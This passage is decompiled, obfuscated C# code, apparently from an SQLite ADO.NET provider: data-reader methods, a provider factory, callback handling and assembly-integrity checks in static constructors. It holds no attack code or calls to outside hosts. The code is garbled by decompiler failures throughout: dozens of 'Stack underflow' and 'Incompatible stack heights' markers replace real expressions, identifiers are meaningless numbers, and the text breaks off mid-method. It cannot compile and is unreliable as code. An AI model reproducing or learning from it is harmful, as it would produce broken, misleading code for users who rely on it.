				if (value == -1 && this._0001 != null)
				{
					value = _0018._0001(this._0001, _0002);
					if (value > -1)
					{
						value += this._0004;
					}
				}
				this.m__0001.Add(_0002, value);
			}
			return value;
		}

		public override DataTable _0001()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0016: Stack underflow*/);
			return _0018._0001((_0014)/*Error near IL_000d: Stack underflow*/, true, false);
		}

		internal static int _0001(Dictionary<_0001, List<int>> _0002)
		{
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			int num = 0;
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				foreach (_0001 key in ((Dictionary<_0001, List<int>>)/*Error near IL_000e: Stack underflow*/).Keys)
				{
					if (key != null)
					{
						string value = key._0002;
						if (!string.IsNullOrEmpty(value))
						{
							num++;
						}
					}
				}
				return num;
			}
			return num;
		}

		public override string _0003(int _0002)
		{
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00d0: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_00ca: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397459), null, obj), ref flag, this, _0002);
				if (flag)
				{
					return obj._0001;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				_001F._0019 obj2 = this._0001;
				int num = _0002 - this._0004;
				return _0018._0001(num, obj2);
			}
			if ((this._0001 & SQLiteConnectionFlags.NoVerifyTextAffinity) != SQLiteConnectionFlags.NoVerifyTextAffinity)
			{
				_0018._0001(this, _0002, DbType.String);
			}
			return this._0001._0001._0005(this._0001, _0002);
		}

		public override object _0001(int _0002)
		{
			//IL_0132: Incompatible stack heights: 0 vs 1
			//IL_0142: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_013c: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107397414), null, obj), ref flag, this, _0002);
				if (flag)
				{
					return obj._0001;
				}
			}
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			_001F._0018 obj2 = _0018._0001(this, this._0001, _0002);
			if ((this._0001 & SQLiteConnectionFlags.DetectTextAffinity) == SQLiteConnectionFlags.DetectTextAffinity && (obj2 == null || obj2._0001 == global::_0014._0017._0004))
			{
				obj2 = _0018._0001(this, obj2, this._0001._0001._0005(this._0001, _0002));
			}
			else if ((this._0001 & SQLiteConnectionFlags.DetectStringType) == SQLiteConnectionFlags.DetectStringType && (obj2 == null || _0018._0001(obj2._0001)))
			{
				obj2 = _0018._0001(this, obj2, this._0001._0001._0005(this._0001, _0002));
			}
			return this._0001._0001._0001(this._0001, this._0001, _0002, obj2);
		}

		public override int _0001(object[] _0002)
		{
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 2
			_0018._0001((_0014)/*Error near IL_0040: Stack underflow*/);
			_ = global::_001A._007E_001C_0003;
			int num = /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			if (_0002.Length < num)
			{
				num = _0002.Length;
			}
			for (int i = 0; i < num; i++)
			{
				_0002[i] = _008F_0004._007E_0015_000E(this, i);
			}
			return num;
		}

		public override bool _0002(int _0002)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0050: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_000b: Stack underflow*/);
			if (_0002 >= this._0004 && this._0001 != null)
			{
				return _0018._0001(this._0001, _0002 - this._0004);
			}
			return this._0001._0001._0002(this._0001, _0002);
		}

		public override bool _0003()
		{
			//IL_0246: Incompatible stack heights: 0 vs 1
			//IL_0256: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0250: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			_ = this._0002;
			global::_0013._0017 obj = null;
			bool flag = (this.m__0001 & CommandBehavior.SchemaOnly) != 0;
			int num2;
			while (true)
			{
				if (obj == null && this._0001 != null && this._0001._0001 != null && this._0001._0001._0003())
				{
					if (!flag)
					{
						this._0001._0001._0001(this._0001);
					}
					if ((this.m__0001 & CommandBehavior.SingleResult) != 0)
					{
						while (true)
						{
							obj = _0018._0001(this._0001, this.m__0001 + 1);
							if (obj == null)
							{
								break;
							}
							this.m__0001++;
							if (!flag && obj._0001._0001(obj))
							{
								_0005++;
							}
							if (obj._0001._0001(obj) == 0)
							{
								int num = 0;
								bool flag2 = false;
								if (!_0018._0001(ref num, obj, ref flag2))
								{
									return false;
								}
								if (!flag2)
								{
									if (this.m__0003 == -1)
									{
										this.m__0003 = 0;
									}
									this.m__0003 += num;
								}
							}
							if (!flag)
							{
								obj._0001._0001(obj);
							}
						}
						return false;
					}
				}
				obj = _0018._0001(this._0001, this.m__0001 + 1);
				if (obj == null)
				{
					return false;
				}
				if (this._0002 < 1)
				{
					this._0002 = 1;
				}
				this.m__0001++;
				num2 = obj._0001._0001(obj);
				if (flag && num2 != 0)
				{
					break;
				}
				if (!flag && obj._0001._0001(obj))
				{
					_0005++;
					this._0002 = -1;
					break;
				}
				if (num2 == 0)
				{
					int num3 = 0;
					bool flag3 = false;
					if (_0018._0001(ref num3, obj, ref flag3))
					{
						if (!flag3)
						{
							if (this.m__0003 == -1)
							{
								this.m__0003 = 0;
							}
							this.m__0003 += num3;
						}
						if (!flag)
						{
							obj._0001._0001(obj);
						}
						continue;
					}
					return false;
				}
				this._0002 = 1;
				break;
			}
			this._0001 = obj;
			this._0004 = num2;
			this.m__0001 = new Dictionary<string, int>(_007F_0004._008D_0008());
			this._0001 = new _001F._0018[this._0004];
			if ((this.m__0001 & CommandBehavior.KeyInfo) != 0)
			{
				_0018._0001(this);
			}
			return true;
		}

		public override bool _0004()
		{
			//IL_0090: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_009a: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			_ = this._0002;
			if ((this.m__0001 & CommandBehavior.SchemaOnly) != 0)
			{
				return false;
			}
			if (this._0002 == -1)
			{
				this._0002 = 0;
				return true;
			}
			if (this._0002 == 0)
			{
				if ((this.m__0001 & CommandBehavior.SingleRow) == 0 && this._0001._0001._0001(this._0001))
				{
					_0005++;
					if (this._0001 != null)
					{
						_0018._0001(this._0001);
					}
					return true;
				}
				this._0002 = 1;
			}
			return false;
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001C
{
	internal static class _0016
	{
		public static readonly IList<string> _0001;

		static _0016()
		{
			//IL_01cf: Incompatible stack heights: 0 vs 1
			bool flag;
			if (0 == 0)
			{
				flag = false;
			}
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_01d5: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new List<string>(new string[20]
			{
				_0080._0014._0001(107397433),
				_0080._0014._0001(107397380),
				_0080._0014._0001(107364095),
				_0080._0014._0001(107364062),
				_0080._0014._0001(107364029),
				_0080._0014._0001(107363988),
				_0080._0014._0001(107363955),
				_0080._0014._0001(107363922),
				_0080._0014._0001(107363889),
				_0080._0014._0001(107363860),
				_0080._0014._0001(107364331),
				_0080._0014._0001(107364298),
				_0080._0014._0001(107364305),
				_0080._0014._0001(107364264),
				_0080._0014._0001(107364275),
				_0080._0014._0001(107364226),
				_0080._0014._0001(107364205),
				_0080._0014._0001(107364216),
				_0080._0014._0001(107364163),
				null
			});
		}
	}
}
namespace _0080
{
	internal enum _0017
	{
		_0001 = -1,
		_0002 = 0,
		_0003 = 1,
		_0004 = 2,
		_0005 = 3,
		_0006 = 4,
		_0007 = 5,
		_0008 = 6,
		_000E = 7,
		_000F = 8,
		_0010 = 9,
		_0011 = 10,
		_0012 = 11,
		_0013 = 12,
		_0014 = 13,
		_0015 = 14,
		_0016 = 15,
		_0017 = 16,
		_0018 = 17,
		_0019 = 18,
		_001A = 19,
		_001B = 20,
		_001C = 21,
		_001D = 22,
		_001E = 23,
		_001F = 24,
		_007F = 25,
		_0080 = 26,
		_0081 = 27,
		_0082 = 28,
		_0083 = 100,
		_0084 = 101,
		_0086 = 255,
		_0087 = 266,
		_0088 = 522,
		_0089 = 778,
		_008A = 1034,
		_008B = 1290,
		_008C = 1546,
		_008D = 1802,
		_008E = 2058,
		_008F = 2314,
		_0090 = 2570,
		_0091 = 2826,
		_0092 = 3082,
		_0093 = 3338,
		_0094 = 3594,
		_0095 = 3850,
		_0096 = 4106,
		_0097 = 4362,
		_0098 = 4618,
		_0099 = 4874,
		_009A = 5130,
		_009B = 5386,
		_009C = 5642,
		_009D = 5898,
		_009E = 6154,
		_009F = 6410,
		_0001_0002 = 6666,
		_0002_0002 = 6922,
		_0003_0002 = 7178,
		_0004_0002 = 262,
		_0005_0002 = 261,
		_0006_0002 = 517,
		_0007_0002 = 270,
		_0008_0002 = 526,
		_000E_0002 = 782,
		_000F_0002 = 1038,
		_0010_0002 = 267,
		_0011_0002 = 264,
		_0012_0002 = 520,
		_0013_0002 = 776,
		_0014_0002 = 1032,
		_0015_0002 = 516,
		_0016_0002 = 275,
		_0017_0002 = 531,
		_0018_0002 = 787,
		_0019_0002 = 1043,
		_001A_0002 = 1299,
		_001B_0002 = 1555,
		_001C_0002 = 1811,
		_001D_0002 = 2067,
		_001E_0002 = 2323,
		_001F_0002 = 2579,
		_007F_0002 = 283,
		_0080_0002 = 539,
		_0081_0002 = 284,
		_0082_0002 = 279,
		_0083_0002 = 256
	}
}
namespace _0017
{
	internal sealed class _0082 : DbProviderFactory, IDisposable, IServiceProvider
	{
		internal bool _0001;

		public static readonly _0082 _0001;

		internal static readonly string _0001;

		internal static readonly BindingFlags _0001;

		private static Type m__0001;

		internal static object _0001;

		public event global::_0010._001F Log
		{
			add
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				global::_0015._0016.Log += (global::_0010._001F)/*Error near IL_000b: Stack underflow*/;
			}
			remove
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				global::_0015._0016.Log -= (global::_0010._001F)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_001a: Stack underflow*/ != 0, (_0082)/*Error near IL_001a: Stack underflow*/);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 2
			try
			{
				_ = 0;
				global::_0011._0018._0001((byte)/*Error near IL_000f: Stack underflow*/ != 0, (_0082)/*Error near IL_000f: Stack underflow*/);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public override DbCommand _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new global::_0010._001C();
			return (DbCommand)/*Error near IL_0007: Stack underflow*/;
		}

		public override DbCommandBuilder _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new global::_001D._0019();
			return (DbCommandBuilder)/*Error near IL_0007: Stack underflow*/;
		}

		public override DbConnection _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new _0080();
			return (DbConnection)/*Error near IL_0007: Stack underflow*/;
		}

		public override DbConnectionStringBuilder _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new global::_0006._0017();
			return (DbConnectionStringBuilder)/*Error near IL_0007: Stack underflow*/;
		}

		public override DbDataAdapter _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new global::_001E._0013();
			return (DbDataAdapter)/*Error near IL_0007: Stack underflow*/;
		}

		public override DbParameter _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_000f: Stack underflow*/);
			new global::_0011._0016();
			return (DbParameter)/*Error near IL_0007: Stack underflow*/;
		}

		static _0082()
		{
			//IL_0125: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_012b: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0082._0001 = new _0082();
			_0082._0001 = global::_0080._0014._0001(107364148);
			_0082._0001 = BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic;
			global::_0011._0018._0001();
			global::_0011._0018._0001();
			string text = global::_0080._0014._0001(107363454);
			_0082.m__0001 = _0096_0004._001E_000E(global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107363441), new object[1] { text }), false);
		}

		private object _0001(Type _0002)
		{
			//IL_001e: Invalid comparison between Unknown and O
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_0091._0080_0004(typeof(global::_000F._0011).TypeHandle);
			if (/*Error near IL_0010: Stack underflow*/ != /*Error near IL_0010: Stack underflow*/)
			{
				if ((object)_0082.m__0001 != null)
				{
					Type type = _0082.m__0001;
					if ((object)/*Error near IL_0020: Stack underflow*/ == type)
					{
						goto IL_0020;
					}
				}
				return null;
			}
			goto IL_0020;
			IL_0020:
			return global::_0011._0018._0001(this);
		}

		object IServiceProvider.GetService(Type _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002);
		}
	}
}
namespace _0012
{
	internal abstract class _0014 : IDisposable
	{
		private sealed class _0001
		{
			internal int _0001 = 1;

			internal object _0001;

			static _0001()
			{
				//IL_00bb: Incompatible stack heights: 0 vs 1
				bool flag = false;
				global::_0001._0001();
				Assembly assembly;
				if (true)
				{
					assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
				}
				Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
				if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
				{
					return;
				}
				throw new SecurityException(_0080._0014._0001(107396706));
			}
		}

		internal global::_0011._0013 _0001;

		private Dictionary<IntPtr, _0001> m__0001;

		internal SQLiteConnectionFlags _0001;

		internal _0019._001F _0001;

		internal _0019._001F _0002;

		internal global::_0002._001C _0001;

		internal global::_0006._001A _0001;

		internal global::_0006._001A _0002;

		internal IntPtr _0001;

		internal static IDictionary<_0019._007F, object> _0001;

		internal bool _0001;

		public global::_0001._001A SQLiteConvert
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
				return ((_0014)/*Error near IL_000b: Stack underflow*/)._0001;
			}
		}

		protected _0014()
		{
			this.m__0001 = new Dictionary<IntPtr, _0001>();
		}

		protected _0014(SQLiteDateFormats _0086_0086, DateTimeKind _0019_0087, string _0011_0013_0006, bool _0002_001F_0006)
			: this()
		{
			if (_0002_001F_0006)
			{
				this._0001 = new _0016._001A(_0086_0086, _0019_0087, _0011_0013_0006, IntPtr.Zero, null, _000F_0017_0006: false);
			}
			else
			{
				this._0001 = new global::_0002._0019(_0086_0086, _0019_0087, _0011_0013_0006, IntPtr.Zero, null, _000F_0017_0006: false);
			}
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0014)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_00b2: Incompatible stack heights: 0 vs 1
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_000a: Stack underflow*/)._0001)
			{
				return;
			}
			if ((int)/*Error near IL_0019: Stack underflow*/ != 0)
			{
				foreach (KeyValuePair<IntPtr, _0001> item in ((_0014)/*Error near IL_0023: Stack underflow*/).m__0001)
				{
					if (item.Value._0001 is IDisposable disposable)
					{
						global::_0008._007E_0098(disposable);
					}
				}
				this.m__0001.Clear();
				this.m__0001 = null;
				this._0001 = SQLiteConnectionFlags.None;
				this._0001 = null;
				this._0002 = null;
				this._0001 = null;
				this._0001 = null;
				this._0001 = null;
			}
			this._0001 = true;
		}

		~_0014()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0014)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public virtual object _0001(object[] _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_000e: Stack underflow*/);
			return null;
		}

		public virtual void _0001(object[] _0002, int _0003, ref object _0004)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_000d: Stack underflow*/);
		}

		public virtual object _0001(object _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_000e: Stack underflow*/);
			return null;
		}

		public virtual int _0001(string _0002, string _0003)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_000e: Stack underflow*/);
			return 0;
		}

		internal void _0001(IntPtr _0002, int _0003, IntPtr _0004)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			try
			{
				((_0014)/*Error near IL_0009: Stack underflow*/)._0001 = (IntPtr)/*Error near IL_0009: Stack underflow*/;
				object obj = _0001(global::_0011._0018._0001(_0003, this, _0004));
				global::_0011._0018._0001((IntPtr)/*Error near IL_001f: Stack underflow*/, obj, this);
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0001 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363759), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		internal int _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005, IntPtr _0006)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			try
			{
				string text = global::_0011._0018._0001((IntPtr)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
				string text2 = global::_0011._0018._0001(_0006, _0005);
				return ((_0014)/*Error near IL_0019: Stack underflow*/)._0001(text, text2);
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0001 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363734), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			if (this._0001 != null && this._0001._0003())
			{
				this._0001._0001();
			}
			return 0;
		}

		internal int _0002(IntPtr _0002, int _0003, IntPtr _0004, int _0005, IntPtr _0006)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			try
			{
				string text = global::_0011._0018._0001((IntPtr)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
				string text2 = global::_0011._0018._0001(_0006, _0005);
				return ((_0014)/*Error near IL_0019: Stack underflow*/)._0001(text, text2);
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0001 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363669), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			if (this._0001 != null && this._0001._0003())
			{
				this._0001._0001();
			}
			return 0;
		}

		internal void _0002(IntPtr _0002, int _0003, IntPtr _0004)
		{
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			try
			{
				_0001 value = default(_0001);
				if (0 == 0)
				{
					value = null;
				}
				if (((_0014)/*Error near IL_0012: Stack underflow*/)._0001 != null)
				{
					IntPtr key = ((_0014)/*Error near IL_001e: Stack underflow*/)._0001._0001(_0002);
					if (this.m__0001 != null && !this.m__0001.TryGetValue(key, out value))
					{
						value = new _0001();
						this.m__0001[key] = value;
					}
				}
				if (value == null)
				{
					value = new _0001();
				}
				try
				{
					this._0001 = _0002;
					_0001(global::_0011._0018._0001(_0003, this, _0004), value._0001, ref value._0001);
				}
				finally
				{
					value._0001++;
				}
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0001 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363600), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		internal void _0001(IntPtr _0002)
		{
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			try
			{
				object obj = null;
				if (((_0014)/*Error near IL_000d: Stack underflow*/)._0001 != null)
				{
					IntPtr key = ((_0014)/*Error near IL_0019: Stack underflow*/)._0001._0001(_0002);
					if (this.m__0001 != null && this.m__0001.TryGetValue(key, out var value))
					{
						obj = value._0001;
						this.m__0001.Remove(key);
					}
				}
				try
				{
					this._0001 = _0002;
					global::_0011._0018._0001(_0002, _0001(obj), this);
				}
				finally
				{
					if (obj is IDisposable disposable)
					{
						global::_0008._007E_0098(disposable);
					}
				}
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0001 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363035), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		static _0014()
		{
			//IL_0165: Incompatible stack heights: 0 vs 1
			//IL_016f: Incompatible stack heights: 0 vs 1
			//IL_017d: Incompatible stack heights: 0 vs 1
			new Dictionary<_0019._007F, object>();
			_0014._0001 = (IDictionary<_0019._007F, object>)/*Error near IL_000a: Stack underflow*/;
			try
			{
				_0080._0014._0001(107362950);
				global::_0011._0018._0001((string)/*Error near IL_016f: Stack underflow*/, (string)null);
				if ((int)/*Error near IL_001c: Stack underflow*/ != 0)
				{
					return;
				}
				Assembly[] array = _0098_0004._007E_007F_000E(_0097_0004._001F_000E());
				int num = array.Length;
				AssemblyName assemblyName = _001B_0004._007E_0087_0008(global::_0001._0001());
				for (int i = 0; i < num; i++)
				{
					bool flag = false;
					Type[] array3;
					try
					{
						AssemblyName[] array2 = _0099_0004._007E_0080_000E(array[i]);
						int num2 = array2.Length;
						for (int j = 0; j < num2; j++)
						{
							if (_0010_0003._008B_0006(global::_0002._007E_0015(array2[j]), global::_0002._007E_0015(assemblyName)))
							{
								flag = true;
								break;
							}
						}
						if (!flag)
						{
							continue;
						}
						array3 = _009A_0004._007E_0081_000E(array[i]);
						goto IL_00d9;
					}
					catch (ReflectionTypeLoadException ex)
					{
						array3 = _009A_0004._007E_0082_000E(ex);
						goto IL_00d9;
					}
					IL_00d9:
					int num3 = array3.Length;
					for (int k = 0; k < num3; k++)
					{
						if ((object)array3[k] == null)
						{
							continue;
						}
						object[] array4 = _001D_0004._007E_008A_0008(array3[k], _0091._0080_0004(typeof(_0019._007F).TypeHandle), false);
						int num4 = array4.Length;
						for (int l = 0; l < num4; l++)
						{
							if (array4[l] is _0019._007F obj)
							{
								obj._0001 = array3[k];
								global::_0011._0018._0001((object)null, obj);
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
namespace _0013
{
	internal delegate object _0016(string param0, object[] args);
}
namespace _0007
{
	internal delegate void _001D(string param0, object[] args, int stepNumber, ref object contextData);
}
namespace _001A
{
	internal delegate object _0017(string param0, object contextData);
}
namespace _001E
{
	internal delegate int _0014(string param0, string param1, string param2);
}
namespace _0006
{
	internal sealed class _0019 : global::_0012._0014
	{
		private new const string m__0001 = "No \"{0}\" callback is set.";

		private new const string _0002 = "\"{0}\" result must be Int32.";

		private new Delegate m__0001;

		private new Delegate _0002;

		public virtual Delegate Callback1
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0019)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0019)/*Error near IL_0009: Stack underflow*/).m__0001 = (Delegate)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public virtual Delegate Callback2
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0019)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0019)/*Error near IL_0009: Stack underflow*/)._0002 = (Delegate)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0019()
			: this(null, null)
		{
		}

		public _0019(Delegate _0093_0019_0006, Delegate _0094_0019_0006)
		{
			this.m__0001 = _0093_0019_0006;
			_0002 = _0094_0019_0006;
		}

		protected new virtual object[] _0001(object[] _0002, bool _0003)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			object[] array = new object[2];
			_ = 0;
			_0080._0014._0001(107362925);
			((object[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/] = (object)/*Error near IL_0013: Stack underflow*/;
			array[1] = _0002;
			object[] array2 = array;
			if (!_0003)
			{
